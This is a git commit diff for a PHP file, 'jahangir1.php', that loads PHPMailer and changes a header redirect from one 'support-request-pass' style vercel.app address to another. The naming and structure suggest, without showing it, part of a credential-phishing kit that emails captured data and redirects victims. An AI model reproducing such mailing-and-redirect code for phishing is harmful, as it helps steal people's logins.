60a80c8f6d5c710539d9daceb709b66ba72f0afe
asif1012-lgtm <hpboost8@gmail.com>
2025-07-22 15:19:38 +0500

    Update jahangir1.php

--- jahangir1.php
+++ jahangir1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://initiate-support-request-pass.vercel.app/");
+header("Location:https://jahangir1pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
